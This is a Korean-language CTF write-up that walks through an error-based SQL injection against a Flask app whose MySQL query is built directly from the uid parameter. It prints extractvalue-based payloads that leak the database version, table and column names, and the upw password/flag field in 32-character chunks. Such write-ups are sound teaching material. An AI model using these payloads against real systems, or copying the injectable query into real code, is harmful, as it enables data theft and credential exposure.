## 코드

```python
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```

## 풀이

코드는 별거 없고, uid에 무언가 값을 입력해서 sql injection을 성공해야 한다.
이때 uid를 아무리 건드려도 뭔가 답이 나오지 않으므로, 문제 제목에서 힌트를 얻어 error based sql injection을 수행해야 한다.
근데 error based sql injection 관련해서 아는게 별로 없어 MySQL error based sql injection을 검색해봤다.
(서버 코드에 MySQL이라고 나와있다.)

```sql
select extractvalue(1, concat(0x3a, version()))
```

이런 문장이 에러를 발생시킬 수 있다고 한다. 
여기서 extractvalue()는 XML 내장함수라고 하는데, 이때 해당 쿼리에서 에러가 발생한다면 두번째 인자 부분(concat(0x3a, version()))의 결과가 노출된다고 한다.

그래서 정말 되는지 확인해보기 위해 다음과 같이 쿼리를 입력했다.

```sql
3' union select extractvalue(1, concat(0x3a, version()))'
```

입력하니 정말 에러화면 속에서 MySQL 버전 정보가 나타났다!

이를 활용해 테이블 이름 조회, 컬럼 이름 조회, 컬럼 값 조회 쿼리를 각각 작성해봤다.

```dart
// limit N, 1을 통해 N번째 테이블 이름 조회
3' union select extractvalue(1, concat(0x2e, (select table_name from information_schema.tables where table_type='base table' limit 0,1)))'

// limit N, 1을 통해 N번째 컬럼 이름 조회
3' union select extractvalue(1, concat(0x2e, (select column_name from information_schema.columns where table_name = 'user' limit 0,1)))'

// limit N, 1을 통해 N번째 데이터 조회
3' union select extractvalue(1, concat(0x2e, (select substr(concat_ws(0x2c, upw), 1, 32) from user limit 0,1)))'
```

이때 XML 내장함수로 에러를 발생시키면 에러가 32길이만큼만 나온다고 한다. 따라서 upw에 있는 Flag가 짤려서 나오므로, substr을 활용해 나눠서 upw를 확인해야 한다.

```dart
// limit N, 1을 통해 N번째 데이터 조회
3' union select extractvalue(1, concat(0x2e, (select substr(concat_ws(0x2c, upw), 1, 32) from user limit 0,1)))'
3' union select extractvalue(1, concat(0x2e, (select substr(concat_ws(0x2c, upw), 33, 64) from user limit 0,1)))'
```

